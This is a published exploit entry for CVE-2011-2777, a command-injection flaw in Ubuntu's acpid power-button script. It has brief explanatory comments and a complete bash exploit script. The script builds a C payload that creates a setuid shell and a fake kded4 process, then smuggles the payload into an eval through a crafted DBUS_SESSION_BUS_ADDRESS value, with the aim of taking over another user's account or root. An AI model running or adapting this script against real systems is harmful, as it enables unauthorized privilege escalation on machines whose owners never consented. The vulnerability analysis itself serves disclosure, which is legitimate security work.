# Exploit Title: Acpid Privilege Boundary Crossing Vulnerability
# Google Dork:
# Date: 23-11-2011
# Author: otr
# Software Link: https://launchpad.net/ubuntu/+source/acpid 
# Version: 1:2.0.10-1ubuntu2
# Tested on: Ubuntu 11.10, Ubuntu 11.04
# CVE : CVE-2011-2777
# -- 
# Safeguard this letter, it may be an IMPORTANT DOCUMENT

#!/bin/bash
#
# otr
# 
# The following script is executed when pressing the power button on an Ubuntu
# 11.10 system. Depending on how far we get in the condition in the code
# fragement, it is possible for another user on the local system to gain the
# privileges of the user who has the currently focused display running.  The
# vulnerability only triggers when certain power management programms are not
# running, especially kded4 and the programms in the $PMS variable need not to
# be running in order for this to be exploitable.
#
# This exploit would be more reliable when having a way to dos
# gnome-power-manager Also it would be more fun one could trick the getXuser
# function into setting $XUSER to root. In the case of root being the user on
# the active display this exploit turns into a privilege escalation
#
# Exploitable file /etc/acpi/powerbtn.sh
# In original source code line 40
#
# --
# PMS="gnome-power-manager kpowersave xfce4-power-manager"
# PMS="$PMS guidance-power-manager.py dalston-power-applet"
#
# if pidof x $PMS > /dev/null ||
#        ( test "$XUSER" != "" && \
#		pidof dcopserver > /dev/null && \
#		test -x /usr/bin/dcop && \
#		/usr/bin/dcop --user $XUSER kded kded loadedModules \
#		 | grep -q klaptopdaemon) ||
#        ( test "$XUSER" != "" && \
#		test -x /usr/bin/qdbus && \
#		test -r /proc/$(pidof kded4)/environ && \
#		su - $XUSER -c \
#			"eval $(echo -n 'export '; cat /proc/$(pidof kded4)/environ | \
#			tr '\0' '\n' | \
#			grep DBUS_SESSION_BUS_ADDRESS); \
#			qdbus org.kde.kded" | \
#			grep -q powerdevil) ;\
# then
# -- 
# 
# The problem here is that the output of cat /proc/$(pidof kded4)/environ is
# controllable by a local user by exporting the DBUS_SESSION_BUS_ADDRESS
# variable and running a programm called kded4.
# Using this environment variable the attack is able to inject arbitrary shell
# commands into the eval expression which will be executed with the rights
# of $XUSER which is the user with the currently active display.
#
# /usr/share/acpi-support/policy-funcs in the PowerDevilRunning function
# has similar code but it seems that under normal conditions this only
# allows to run code with the privileges one already has.

PAYLOADEXE="/var/crash/payload"
PAYLOADC="/var/crash/payload.c"

KDEDC="kded4.c"
KDEDEXE="kded4"

TRIGGER="/etc/acpi/powerbtn.sh"

rm -f $PAYLOADEXE $KDEDEXE $KDEDC $PAYLOADC

echo "[+] Setting umask to 0 so we have world writable files."
umask 0


echo "[+] Preparing binary payload."
# we _try_ to get a suid root shell, if not we only get a
# shell for another user
cat > $PAYLOADC <<_EOF
#include <sys/stat.h>
void main(int argc, char **argv)
{
	if(!strstr(argv[0],"shell")){
		printf("[+] Preparing suid shell.\n");
		system("cp /var/crash/payload /var/crash/shell");
		setuid(0);
		setgid(0);
		chown ("/var/crash/shell", 0, 0);
		chmod("/var/crash/shell", S_IRWXU | S_IRWXG | S_IRWXO | S_ISUID | S_ISGID);
	}else{
		execl("/bin/sh", "/bin/sh", "-i", 0);
	}
}
_EOF
gcc -w -o $PAYLOADEXE $PAYLOADC

echo "[+] Preparing fake kded4 process."
cat > $KDEDC <<_EOF
#include <unistd.h>
void main (){
	while(42){
		sleep(1);
		if( access( "/var/crash/shell" , F_OK ) != -1 ) {
			execl("/var/crash/shell", "/var/crash/shell", "-i", 0);
			exit(0);
		}
	}
}
_EOF

gcc -w -o $KDEDEXE $KDEDC
rm -f $KDEDC $PAYLOADC

echo "[+] Exporting DBUS_SESSION_BUS_ADDRESS."
export DBUS_SESSION_BUS_ADDRESS="xxx & $PAYLOADEXE"

echo "[+] Starting kded4."
echo "[+] Trying to PMS the system."
echo "[+] Waiting for the power button to be pressed."
echo "[+] You'll get a shell on this console."
./$KDEDEXE

rm $KDEDEXE